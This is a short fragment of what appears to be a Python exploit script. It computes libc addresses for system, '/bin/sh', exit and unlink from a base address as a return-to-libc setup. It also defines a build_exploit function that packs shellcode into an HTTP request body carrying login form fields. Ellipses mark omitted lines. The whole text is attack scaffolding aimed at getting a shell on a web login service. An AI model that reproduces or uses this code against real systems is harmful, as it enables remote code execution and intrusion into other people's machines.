...
# system
sys_addr = base_addr + 0x00041370 
# /bin/sh
sh_addr = base_addr + 0x0018b363
# exit
ex_addr = base_addr + 0x00033ed0 
# unlink
ul_addr = base_addr + 0x000f2760
# dead
d_addr = 0xdeadbeef
...
def build_exploit(shellcode):
    ...
    req += ("login_username=lm&login_password=lm&submit_login=Login").encode('latin-1')
